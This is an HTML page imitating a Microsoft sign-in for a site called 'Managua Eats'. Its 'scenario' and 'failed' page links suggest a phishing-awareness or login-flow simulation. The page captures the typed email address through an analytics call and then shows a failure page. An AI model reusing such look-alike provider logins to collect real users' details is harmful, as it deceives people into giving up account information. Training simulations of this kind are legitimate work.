<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Continuar con Microsoft</title>
  <link rel="icon" href="favicon.svg" type="image/svg+xml">
  <link rel="stylesheet" href="styles.css">
</head>
<body class="auth-page">
  <main class="provider-card">
    <div class="provider-topline">
      <div class="provider-icon large provider-ms">▦</div>
      <span>Cuenta externa</span>
    </div>

    <h1>Iniciar sesión</h1>
    <p class="subtle">Usa tu correo para continuar a <strong>Managua Eats</strong>.</p>

    <form id="providerMicrosoftForm" class="auth-form">
      <div class="field floating">
        <input id="msEmail" type="email" autocomplete="off" placeholder=" " required>
        <label for="msEmail">Correo electrónico</label>
      </div>

      <div class="provider-footer-row">
        <a class="text-link" href="scenario.html">Atrás</a>
        <button id="msNext" class="primary auto" type="submit">
          <span class="btn-label">Siguiente</span>
          <span class="spinner" aria-hidden="true"></span>
        </button>
      </div>
    </form>
  </main>

  <script src="script.js"></script>
  <script>
    track("login_microsoft_view");
    document.getElementById("providerMicrosoftForm").addEventListener("submit", function(e){
      e.preventDefault();
      const email = document.getElementById("msEmail").value.trim();
      const btn = document.getElementById("msNext");
      setLoading(btn, true);
      track("microsoft_email_submitted", { email });
      setTimeout(() => location.href = "failed.html?scenario=microsoft", 500);
    });
  </script>
</body>
</html>
